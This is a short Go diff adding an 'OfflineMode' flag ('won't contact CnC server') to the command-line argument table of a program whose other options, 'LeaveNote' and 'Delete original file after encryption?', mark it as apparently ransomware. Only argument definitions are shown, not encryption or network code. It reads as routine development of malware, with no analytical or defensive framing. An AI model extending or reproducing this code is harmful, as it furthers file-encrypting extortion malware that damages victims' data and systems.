@@ -51,6 +51,14 @@ var cliArgs = []CommandLineArg{
 		settingsField: "LeaveNote",
 	},
 	{
+		name: "OfflineMode",
+		info: CommandLineArgInfo{description: "Run in offline mode", isBool: true, required: Optional},
+		flags: []CommandLineFlag{
+			{flag: "-off", description: "won't contact CnC server", settingsValue: true},
+		},
+		settingsField: "OfflineMode",
+	},
+	{
 		name: "Delete",
 		info: CommandLineArgInfo{description: "Delete original file after encryption?", isBool: true, required: Optional},
 		flags: []CommandLineFlag{
